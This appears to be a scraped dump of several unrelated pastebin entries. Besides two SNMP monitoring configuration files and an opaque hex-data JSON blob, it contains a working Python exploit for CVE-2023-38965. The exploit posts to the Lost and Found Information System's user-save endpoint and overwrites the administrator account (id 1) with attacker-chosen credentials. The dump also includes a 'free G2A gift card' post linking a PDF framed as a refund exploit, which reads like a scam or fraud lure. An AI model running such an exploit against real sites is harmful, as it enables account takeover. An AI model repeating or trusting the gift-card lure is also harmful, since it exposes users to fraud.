id,title,username,language,date,content
7sJqMTrf,data840,TestGuy1,JSON,Wednesday 14th of February 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c6b0eab32843bc840a66caff3cccef332478af48f17d2b3a2c915820b4713b4a1daa5f634801ca5bdb082c69b16f372f1d6a960da97f634f9591523e83b21242c5d4490d539368c48f780c4af4d6a44bc055a6a1182d97cbd3fc433e22961e77fcf3872495b3fb93904dde0ea6f8b1f38e30b862f6f2cb9b3355c0d94e9e68ff',
  otherdata: [
    '8512aebe7dc19dd423c82eef1fc9ba80',
    'b83da319bb9f27503b8bf7c5cc325911',
    '314716233baf36f1af8b40a58a21787b',
    '4c53c3921283445b36ab7aced7387a83',
    '8b334c3c8fd27a03810f6c125491d19f',
    '6cf04051f097f58cebf12af087934db0',
    '8806aa54cb6ea984bcbb2d1418b45b99',
    '391da3aa66ff60cb974d1fab0b615676'
  ]
}"
R6U2W1K4,Lost and Found Information System v1.0 - ( IDOR ) leads to Account Take over - CVE-2023-38965,FlyFar,Python,Wednesday 14th of February 2024 05:59:38 AM CDT,"# Exploit Title: Lost and Found Information System v1.0 - idor leads to Account Take over 
# Date: 2023-07-16
# Exploit Author: OR4NG.M4N
# Category : webapps
# Tested on: Windows/Linux

Python p0c :

import argparse
import requests
import time
parser = argparse.ArgumentParser(description='Send a POST request to the target server')
parser.add_argument('-url', help='URL of the target', required=True)
parser.add_argument('-user', help='Username', required=True)
parser.add_argument('-password', help='Password', required=True)
args = parser.parse_args()


url = args.url + '/classes/Users.php?f=save'


data = {
    'id': '1',
    'firstname': 'Az7rb',
    'middlename': '',
    'lastname': 'Admin',
    'username': args.user,
    'password': args.password
}

response = requests.post(url, data)
if b""1"" in response.content:
    print(""Exploit .."")
    time.sleep(1)
    print(""User :"" + args.user + ""\nPassword :"" + args.password)
else:
    print(""Exploit Failed.."")"
8CDx02dn,oids,G0nz0uk,YAML,Wednesday 14th of February 2024 05:50:06 AM CDT," # IF-MIB::ifTable contains counters on input and output traffic as well as errors and discards.
  [[inputs.snmp.table]]
    name = ""interface""
    inherit_tags = [ ""hostname"" ]
    oid = ""IF-MIB::ifTable""

    # Interface tag - used to identify interface in metrics database
    [[inputs.snmp.table.field]]
      name = ""ifDescr""
      oid = ""IF-MIB::ifDescr""
      is_tag = true

  # IF-MIB::ifXTable contains newer High Capacity (HC) counters that do not overflow as fast for a few of the ifTable counters
  [[inputs.snmp.table]]
    name = ""interface""
    inherit_tags = [ ""hostname"" ]
    oid = ""IF-MIB::ifXTable""

    # Interface tag - used to identify interface in metrics database
    [[inputs.snmp.table.field]]
      name = ""ifDescr""
      oid = ""IF-MIB::ifDescr""
      is_tag = true

  # EtherLike-MIB::dot3StatsTable contains detailed ethernet-level information about what kind of errors have been logged on an interface (such as FCS error, frame too long, etc)
  [[inputs.snmp.table]]
    name = ""interface""
    inherit_tags = [ ""hostname"" ]
    oid = ""EtherLike-MIB::dot3StatsTable""

    # Interface tag - used to identify interface in metrics database
    [[inputs.snmp.table.field]]
      name = ""ifDescr""
      oid = ""IF-MIB::ifDescr""
      is_tag = true
"
iC09gxUN,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Wednesday 14th of February 2024 05:39:26 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_263532.pdf
 
Working as of
14 February 2024"
1P7Mb3yB,snmp123,G0nz0uk,YAML,Wednesday 14th of February 2024 05:25:16 AM CDT,"# WARNING: This file was auto-generated using snmp_exporter generator, manual changes will be lost.
if_mib:
  walk:
  - 1.3.6.1.2.1.2
  - 1.3.6.1.2.1.31.1.1
  get:
  - 1.3.6.1.2.1.1.3.0
  metrics:
  - name: sysUpTime
    oid: 1.3.6.1.2.1.1.3
    type: gauge
    help: The time (in hundredths of a second) since the network management portion
      of the system was last re-initialized. - 1.3.6.1.2.1.1.3
  - name: ifNumber
    oid: 1.3.6.1.2.1.2.1
    type: gauge
    help: The number of network interfaces (regardless of their current state) present
      on this system. - 1.3.6.1.2.1.2.1
  - name: ifIndex
    oid: 1.3.6.1.2.1.2.2.1.1
    type: gauge
    help: A unique value, greater than zero, for each interface - 1.3.6.1.2.1.2.2.1.1
    indexes:
    - labelname: ifIndex
      type: gauge
    lookups:
    - labels:
      - ifIndex
      labelname: ifAlias
      oid: 1.3.6.1.2.1.31.1.1.1.18
      type: DisplayString
    - labels:
      - ifIndex
      labelname: ifDescr
      oid: 1.3.6.1.2.1.2.2.1.2
      type: DisplayString
    - labels:
      - ifIndex
      labelname: ifName
      oid: 1.3.6.1.2.1.31.1.1.1.1
      type: DisplayString
  - name: ifType
    oid: 1.3.6.1.2.1.2.2.1.3
    type: EnumAsInfo
    help: The type of interface - 1.3.6.1.2.1.2.2.1.3
    indexes:
    - labelname: ifIndex
      type: gauge
    lookups:
    - labels:
      - ifIndex
      labelname: ifAlias
      oid: 1.3.6.1.2.1.31.1.1.1.18
